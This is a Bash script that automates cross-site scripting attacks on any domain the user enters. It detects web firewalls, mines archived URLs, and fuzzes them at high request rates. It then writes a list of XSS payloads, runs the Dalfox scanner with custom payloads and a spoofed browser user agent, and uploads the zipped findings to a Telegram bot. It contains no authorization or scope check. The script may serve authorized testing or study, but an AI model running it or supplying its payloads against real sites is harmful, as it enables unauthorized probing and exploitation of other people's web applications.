#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

# Banner function
display_banner() {
    clear
}

# Input target function
input_target() {
    clear
    echo -e "${BLUE}👽 Single Domain XSS${NC}"
    echo ""
    
    while true; do
        echo -e "${YELLOW}[?] Enter target domain ${NC}(example: example.com)"
        echo -e "${YELLOW}[?] Type 'quit' to exit${NC}"
        echo -ne "\n${GREEN}[+] Target domain: ${NC}"
        read -r input
        
        # Validation logic
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: workspace cannot be empty!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Exiting program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Invalid workspace format!${NC}"
            sleep 1
            continue
        fi
        
        # If valid
        echo -e "\n${GREEN}[✓] Target workspace valid: $input${NC}"
        echo -e "${BLUE}[*] Starting scan...${NC}\n"
        sleep 1
        workspace="$input"  # Set workspace variable
        break
    done
    return 0
}

# Create directory structure
setup_workspace() {
    echo -e "\n${BLUE}[+] Setting up workspace...${NC}"
    mkdir -p "$workspace"/{sources,result/{wayback,gf,xss/{reflected,stored,dom}}}
    echo -e "${GREEN}[✓] Directory structure created${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    if command -v wafw00f &> /dev/null; then
        wafw00f "$workspace" | tee "$workspace/result/waf_detection.txt"
    else
        echo -e "${YELLOW}[!] wafw00f not found - performing basic WAF check${NC}"
        curl -sI "https://$workspace" | grep -i "WAF" | tee "$workspace/result/waf_detection.txt"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    echo -e "${MAGENTA}[*] Focusing only on main workspace: $workspace${NC}"
    
    if command -v waybackurls &> /dev/null; then
        # Collect URLs from wayback machine
        echo "https://$workspace/" | waybackurls | anew "$workspace/result/wayback/wayback-tmp.txt"
        
        echo -e "${MAGENTA}[*] Filtering for main workspace only...${NC}"
        # Filter to include only URLs from the main workspace (no subworkspaces)
        # Remove www. prefix if exists for comparison
        workspace_cleaned=$(echo "$workspace" | sed 's/^www\.//')
        
        cat "$workspace/result/wayback/wayback-tmp.txt" 2>/dev/null | \
            grep -E "^https?://(www\.)?${workspace_cleaned}(/|:|$)" | \
            grep -v -E "^https?://[^/]*\.${workspace_cleaned}" | \
            egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
            sed 's/:80//g;s/:443//g' | sort -u > "$workspace/result/wayback/wayback.txt"
        
        # Additional filter to ensure no subworkspaces
        temp_file=$(mktemp)
        while IFS= read -r url; do
            # Extract hostname from URL
            hostname=$(echo "$url" | sed -E 's|^https?://([^/]+).*|\1|' | sed 's/:.*$//')
            # Check if hostname matches main workspace (with or without www)
            if [[ "$hostname" == "$workspace" ]] || [[ "$hostname" == "www.$workspace" ]] || \
               [[ "$hostname" == "${workspace_cleaned}" ]] || [[ "$hostname" == "www.${workspace_cleaned}" ]]; then
                echo "$url" >> "$temp_file"
            fi
        done < "$workspace/result/wayback/wayback.txt"
        
        mv "$temp_file" "$workspace/result/wayback/wayback.txt"
        
        rm -f "$workspace/result/wayback/wayback-tmp.txt"
        total_urls=$(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $total_urls unique URLs from main workspace only${NC}"
        
        # Show sample of collected URLs
        if [[ $total_urls -gt 0 ]]; then
            echo -e "${YELLOW}[*] Sample of collected URLs:${NC}"
            head -5 "$workspace/result/wayback/wayback.txt" | sed 's/^/    /'
            if [[ $total_urls -gt 5 ]]; then
                echo "    ..."
            fi
        fi
    else
        echo -e "${RED}[!] waybackurls not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    if [[ -f "$workspace/result/wayback/wayback.txt" ]]; then
        ffuf -c -u "FUZZ" -w "$workspace/result/wayback/wayback.txt" -of csv -o "$workspace/result/wayback/valid-tmp.txt" \
             -t 100 -rate 1000
        
        cat "$workspace/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' > "$workspace/result/wayback/valid.txt"
        rm -f "$workspace/result/wayback/valid-tmp.txt"
        
        valid_count=$(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $valid_count valid URLs${NC}"
    else
        echo -e "${RED}[!] No URLs found to validate${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running GF pattern matching...${NC}"
    
    if ! command -v gf &> /dev/null; then
        echo -e "${RED}[!] gf not found${NC}"
        return 1
    fi
    
    patterns=("xss" "reflection" "interestingparams")
    total_patterns=${#patterns[@]}
    current=0
    
    for pattern in "${patterns[@]}"; do
        ((current++))
        echo -e "${MAGENTA}[*] ($current/$total_patterns) Checking for $pattern patterns...${NC}"
        gf "$pattern" "$workspace/result/wayback/valid.txt" 2>/dev/null | tee "$workspace/result/gf/${pattern}.txt"
        count=$(wc -l < "$workspace/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $count potential $pattern endpoints${NC}"
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Create XSS payloads
create_payloads() {
    echo -e "\n${BLUE}[+] Creating XSS payloads...${NC}"
    
    cat > "$workspace/sources/xss-payloads.txt" << 'EOL'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
</title><script>alert(1)</script>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
<img src=x onerror="alert(1)">
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
EOL
    
    total_payloads=$(wc -l < "$workspace/sources/xss-payloads.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Created $total_payloads XSS payloads${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Test for XSS vulnerabilities
test_xss() {
    echo -e "\n${BLUE}[+] Testing for XSS vulnerabilities...${NC}"
    
    # Create results directory
    mkdir -p "$workspace/result/xss"
    
    echo -e "${MAGENTA}[*] Processing potential XSS endpoints...${NC}"
    cat "$workspace/result/gf/xss.txt" 2>/dev/null | \
        grep -E '\bhttps?://[^[:space:]]+[?&][^[:space:]]+=[^[:space:]]+' | \
        sort -u > "$workspace/result/xss/potential_xss.txt"
    
    if [[ -f "$workspace/result/xss/potential_xss.txt" ]]; then
        sed 's/=.*/=/' "$workspace/result/xss/potential_xss.txt" > "$workspace/result/xss/urls_xss.txt"
    fi
    
    potential_count=$(wc -l < "$workspace/result/xss/urls_xss.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found ${potential_count} potential XSS endpoints${NC}"
    
    if [ "$potential_count" -gt 0 ]; then
        echo -e "${MAGENTA}[*] Running Dalfox XSS Scanner...${NC}"
        
        # Run Dalfox with advanced options
        dalfox file "$workspace/result/xss/urls_xss.txt" \
            --skip-mining-all \
            --skip-grepping \
            --custom-payload "'\\\"><script>alert('XSS')</script>,'\\\"><img src=x onerror=alert('XSS')>,'\\\"><svg onload=alert('XSS')>" \
            --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            --timeout 3 \
            --mass-worker 25 \
            --silence \
            --output "$workspace/result/xss/dalfox_results.txt"
        
        # Process Dalfox results and extract confirmed vulnerabilities
        if [ -f "$workspace/result/xss/dalfox_results.txt" ]; then
            echo -e "\n${GREEN}[✓] Dalfox scan completed${NC}"
            
            # Extract and format vulnerable URLs
            grep "POC" "$workspace/result/xss/dalfox_results.txt" | sort -u > "$workspace/result/xss/reflected/vulnerable.txt"
            
            vulnerable_count=$(wc -l < "$workspace/result/xss/reflected/vulnerable.txt" 2>/dev/null || echo "0")
            if [ "$vulnerable_count" -gt 0 ]; then
                echo -e "\n${RED}[!] Found $vulnerable_count confirmed XSS vulnerabilities:${NC}"
                while IFS= read -r vuln; do
                    echo -e "${RED}[+] $vuln${NC}"
                done < "$workspace/result/xss/reflected/vulnerable.txt"
            fi
        fi
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Generate summary report
generate_report() {
    echo -e "\n${BLUE}[+] Generating summary report...${NC}"
    
    report_file="$workspace/result/xss/summary_report.txt"
    
    {
        echo "XSS Vulnerability Scan Report"
        echo "==========================="
        echo "Date: $(date)"
        echo "Target workspace: $workspace"
        echo ""
        echo "Scan Statistics:"
        echo "---------------"
        echo "Total URLs Scanned: $total_urls"
        echo "XSS Payloads Used: $(cat "$workspace/sources/xss-payloads.txt" 2>/dev/null | wc -l)"
        echo ""
        echo "Findings:"
        echo "---------"
        echo "Reflected XSS: $(cat "$workspace/result/xss/reflected/vulnerable.txt" 2>/dev/null | wc -l)"
        
        if [[ -f "$workspace/result/xss/reflected/vulnerable.txt" ]]; then
            echo ""
            echo "Vulnerable Endpoints:"
            cat "$workspace/result/xss/reflected/vulnerable.txt"
        fi
    } > "$report_file"
    
    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    echo -e "\n${BLUE}[+] Preparing to send results to Telegram...${NC}"
    if ! command -v curl &> /dev/null || ! command -v zip &> /dev/null; then
        echo -e "${RED}[!] 'curl' and 'zip' are required but not installed.${NC}"
        return 1
    fi

    # Check both root and config/ directory
    if [[ -f "config/telegram_token.txt" && -f "config/telegram_chat_id.txt" ]]; then
        local token=$(<"config/telegram_token.txt")
        local chat_id=$(<"config/telegram_chat_id.txt")
    elif [[ -f "telegram_token.txt" && -f "telegram_chat_id.txt" ]]; then
        local token=$(<"telegram_token.txt")
        local chat_id=$(<"telegram_chat_id.txt")
    else
        echo -e "${RED}[!] Telegram credentials not found in config/ or root.${NC}"
        return 1
    fi
    local result_dir="$workspace/result"

    local message
    message=$(printf "🔍 *XSS Scan Completed for:* \`%s\`\n\n" "$workspace"
    printf "📊 *Summary:*\n"
    printf " • Total URLs: \`%s\`\n" "$(wc -l < "$result_dir/wayback/wayback.txt" 2>/dev/null || echo 0)"
    printf " • Valid URLs: \`%s\`\n" "$(wc -l < "$result_dir/wayback/valid.txt" 2>/dev/null || echo 0)"
    printf " • Potential XSS: \`%s\`\n\n" "$(wc -l < "$result_dir/xss/dalfox_results.txt" 2>/dev/null || echo 0)"
    printf "📤 Detailed results are attached in the zip file."
    )

    # Send summary message
    echo -e "${BLUE}[*] Sending summary message...${NC}"
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
        -d chat_id="$chat_id" \
        -d text="$message" \
        -d parse_mode="Markdown" > /dev/null

    # 3. Archive Results and Send
    if [ -d "$result_dir" ] && [ "$(ls -A "$result_dir")" ]; then
        local archive_name="results-$(basename "$workspace")-$(date +%F).zip"
        
        echo -e "${BLUE}[*] Creating results archive: ${archive_name}${NC}"
        # Option -j (junk paths) keeps files out of subfolders in zip
        zip -r -j "$archive_name" "$result_dir" > /dev/null

        echo -e "${BLUE}[*] Uploading archive...${NC}"
        curl -s -X POST "https://api.telegram.org/bot$token/sendDocument" \
            -F chat_id="$chat_id" \
            -F document=@"$archive_name" \
            -F caption="All scan results for $workspace" > /dev/null
        
        rm "$archive_name" # Remove zip file after sending
    else
        echo -e "${YELLOW}[!] No result files found to archive in '$result_dir'.${NC}"
    fi
    
    echo -e "${GREEN}[✓] Process completed. Results sent to Telegram.${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    setup_workspace
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    create_payloads
    test_xss
    generate_report
    send_to_telegram
    echo -e "\n${GREEN}[✓] XSS scan completed successfully!${NC}\n"
}

# Run the script
main